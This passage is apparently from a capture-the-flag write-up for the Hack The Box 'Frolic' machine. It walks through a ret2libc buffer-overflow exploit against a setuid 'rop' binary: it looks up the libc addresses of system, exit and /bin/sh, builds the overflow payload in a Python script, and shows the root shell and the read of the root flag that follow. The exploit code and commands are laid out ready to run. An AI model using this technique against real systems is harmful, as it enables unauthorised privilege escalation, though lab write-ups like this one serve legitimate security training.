$3 = {int (const char *)} 0xb7e53da0 <__libc_system>
(gdb) print exit
$4 = {void (int)} 0xb7e479d0 <__GI_exit>


NEED TO FIND THE 2 OFFSET ADDRESSES FOR /BIN/SH

1. GET /BIN/SH OFFSET USING SYMLINK
$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15ba0b /bin/sh
OFFSET =0x0015ba0b

2 GET LIBC OFFSET
$ ldd /home/ayush/.binary/rop
	linux-gate.so.1 =>  (0xb7fda000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
	/lib/ld-linux.so.2 (0xb7fdb000)

COMBINE THE 2 OFFSET ADDRESSES FOR /BIN/SH
/bin/sh : 0x0015ba0b + 0xb7e19000 = 0xb7f74a0b

BUILD PAYLOAD
PAYLOAD = offset + @system + @exit + @params

root@kali:~/htb/frolic# vim frolic.py
root@kali:~/htb/frolic# cat frolic.py 
#!/usr/bin/python

import struct

buf = "A" * 52
system = struct.pack("I" ,0xb7e53da0)
exit = struct.pack("I" ,0xb7e479d0)
shell = struct.pack("I" ,0xb7f74a0b)
print buf + system + exit + shell

TRANSFER OVER ROP TO FROLIC


RUN BOF SCRIPT AND GET ROOT SHELL
$ ./rop `python /tmp/frolic.py`

id
uid=0(root) gid=33(www-data) groups=33(www-data)
hostname
frolic
ifconfig
ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:8a:33  
          inet addr:10.10.10.111  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:8a33/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:8a33/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1100 errors:0 dropped:94 overruns:0 frame:0
          TX packets:574 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:89514 (89.5 KB)  TX bytes:67972 (67.9 KB)
          Interrupt:19 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:82816 errors:0 dropped:0 overruns:0 frame:0
          TX packets:82816 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:6128928 (6.1 MB)  TX bytes:6128928 (6.1 MB)

GET ROOT FLAG
cat /root/root.txt
##############################









